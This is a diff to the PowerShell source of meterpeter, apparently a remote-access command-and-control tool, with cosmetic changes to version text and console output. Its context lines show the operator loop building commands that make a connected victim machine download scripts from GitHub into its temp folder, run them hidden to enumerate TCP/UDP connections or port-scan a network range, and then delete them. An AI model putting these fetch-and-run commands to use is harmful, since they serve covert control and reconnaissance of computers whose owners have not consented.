@@ -4,7 +4,7 @@
 #   Required Dependencies: Invoke-WebRequest
 #   Optional Dependencies: BitsTransfer|Python
 #   PS cmdlet Dev version: v2.10.13
-#   PS cmdlet sub version: v2.10.13.4
+#   PS cmdlet sub version: v2.10.13.5
 #   GitHub: https://github.com/r00t-3xp10it/meterpeter/releases
 ##
 
@@ -1231,12 +1231,12 @@ While($Client.Connected)
          }
          If($ConManager_choise -ieq "Query")
          {
-            write-host " * Enumerating established TCP connections." -ForegroundColor Green
+            write-host " * Enumerating established TCP connections.`n" -ForegroundColor Green
             $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Enum;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
          }
          If($ConManager_choise -ieq "Verbose")
          {
-            write-host " * Enumerating established TCP\UDP connections." -ForegroundColor Green
+            write-host " * Enumerating established TCP\UDP connections.`n" -ForegroundColor Green
             $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Verbose;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
          }
          If($ConManager_choise -ieq "Return" -or $ConManager_choise -ieq "cls" -or $ConManager_choise -ieq "Modules" -or $ConManager_choise -ieq "clear")
@@ -1351,7 +1351,9 @@ While($Client.Connected)
             }
 
             #Execute command remotely
-            Write-Host " * Scanning '$IpRange' ports\services!" -ForegroundColor Green
+            Write-Host " * Scanning '" -ForegroundColor Green -NoNewline
+            Write-Host "$IpRange" -ForegroundColor Red -NoNewline
+            Write-Host "' ports\services!" -ForegroundColor Green
             $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action PortScan -IpRange `"$IpRange`" -ScanType $ScanType -OutPut verbose -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
          }
          If($ping_choise -ieq "Return" -or $ping_choise -ieq "cls" -or $ping_choise -ieq "Modules")
